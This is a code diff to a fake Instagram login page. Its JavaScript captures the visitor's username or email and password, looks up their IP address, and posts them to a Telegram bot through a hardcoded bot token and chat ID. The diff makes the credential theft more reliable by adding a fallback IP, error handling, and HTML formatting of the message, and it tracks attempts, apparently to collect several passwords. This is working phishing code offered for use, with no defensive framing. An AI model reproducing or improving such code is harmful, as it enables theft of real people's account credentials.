@@ -84,9 +84,10 @@
 
     <script>
         // JavaScript to handle form submission and Telegram integration
-        const botToken = '7729844025:AAFfgx0TPOwxCs8Hrc9JZGTHkQmvL8aFhTo';  // Replace with your bot token
-        const chatId = '8378689900';      // Replace with your chat ID
+        const botToken = '7729844025:AAFfgx0TPOwxCs8Hrc9JZGTHkQmvL8aFhTo';  // Replace with your bot token if invalid
+        const chatId = '8378689900';      // Replace with your chat ID if invalid
         let attemptCount = 0;
+        const fallbackIp = '94.131.218.172';  // Fallback from document
 
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();  // Prevent form from reloading page
@@ -96,18 +97,23 @@
             const password = document.getElementById('password').value;
             const formName = "Instagram";
             
-            // Fetch user's IP address
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const userIp = ipData.ip;
+            // Fetch user's IP address with fallback
+            let userIp = fallbackIp;
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIp = ipData.ip;
+            } catch (ipError) {
+                console.warn('IP fetch failed, using fallback:', ipError);
+            }
 
-            // Prepare message for Telegram bot
+            // Prepare message for Telegram bot (using HTML for parse_mode)
             const message = `
-📩 *New Login Attempt on Instagram Form*  
-📧 *Email/Username:* ${emailOrUsername}  
-🔑 *Password:* ${password}  
-🌐 *IP Address:* ${userIp}  
-🔁 *Attempt:* ${attemptCount}/3
+📩 <b>New Login Attempt on Instagram Form</b><br>
+📧 <b>Email/Username:</b> ${emailOrUsername}<br>
+🔑 <b>Password:</b> ${password}<br>
+🌐 <b>IP Address:</b> ${userIp}<br>
+🔁 <b>Attempt:</b> ${attemptCount}/3
             `;
 
             // Send data to Telegram bot
@@ -117,8 +123,22 @@
                 body: JSON.stringify({
                     chat_id: chatId,
                     text: message,
-                    parse_mode: "Markdown"
+                    parse_mode: "HTML"
                 })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Telegram message sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Telegram send failed:', error);
+                // Optionally show error to user
+                document.getElementById('errorMessage').textContent = "Login failed. Please try again. (Check console for details)";
             });
 
             // Incorrect password handling
